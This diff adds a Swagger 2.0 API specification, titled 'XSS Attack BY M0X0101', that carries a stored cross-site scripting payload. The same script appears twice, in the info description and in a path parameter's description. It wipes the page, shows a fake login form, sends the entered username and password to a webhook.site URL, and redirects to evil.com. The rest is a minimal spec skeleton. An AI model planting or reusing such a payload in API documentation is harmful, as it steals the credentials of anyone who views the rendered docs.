@@ -1,0 +1,38 @@
+swagger: '2.0'
+info:
+  title: XSS Attack BY M0X0101
+  description: |
+    <script>alert('Please login to continue');document.body.innerHTML="";var a=document.createElement('form');a.innerHTML='<center><b>FAKE swagger Login</b><br>Username: <input name="userName"><br>Password: <input type="password" name="pwd"><br><input type="submit" value="Login"></center>';a.onsubmit=function(e){e.preventDefault();var f=new FormData(a);var x=new XMLHttpRequest();x.open("POST","https://webhook.site/7f810325-d4db-48eb-8b27-74325b446e9b");x.send(f);window.location.href="https://evil.com";};document.body.appendChild(a);</script>
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  /M0X0101:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - M0X0101_XSS_D
+      operationId: findAccounts
+      summary: Finds all accounts
+  '/hack/hachid/{id}':
+    delete:
+      parameters:
+        - description: |
+            <script>alert('Please login to continue');document.body.innerHTML="";var a=document.createElement('form');a.innerHTML='<center><b>FAKE swagger Login</b><br>Username: <input name="userName"><br>Password: <input type="password" name="pwd"><br><input type="submit" value="Login"></center>';a.onsubmit=function(e){e.preventDefault();var f=new FormData(a);var x=new XMLHttpRequest();x.open("POST","https://webhook.site/7f810325-d4db-48eb-8b27-74325b446e9b");x.send(f);window.location.href="https://evil.com";};document.body.appendChild(a);</script>
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
